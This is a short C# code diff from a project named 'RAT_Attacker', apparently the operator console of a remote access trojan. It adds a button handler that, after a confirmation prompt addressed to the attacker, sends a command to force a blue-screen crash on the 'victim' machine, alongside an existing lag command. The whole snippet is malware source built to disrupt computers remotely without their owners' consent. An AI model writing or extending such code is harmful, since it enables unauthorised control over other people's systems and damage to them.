@@ -118,5 +118,12 @@ namespace RAT_Attacker
         {
             SendCommand(RatCommand.Lag);
         }
+
+        private void Bsod(object sender, RoutedEventArgs e)
+        {
+            if (MessageBox.Show("Do you really want to BSOD your victim?", "Attention",
+                MessageBoxButton.YesNo, MessageBoxImage.Warning) == MessageBoxResult.Yes)
+                SendCommand(RatCommand.Bsod);
+        }
     }
 }
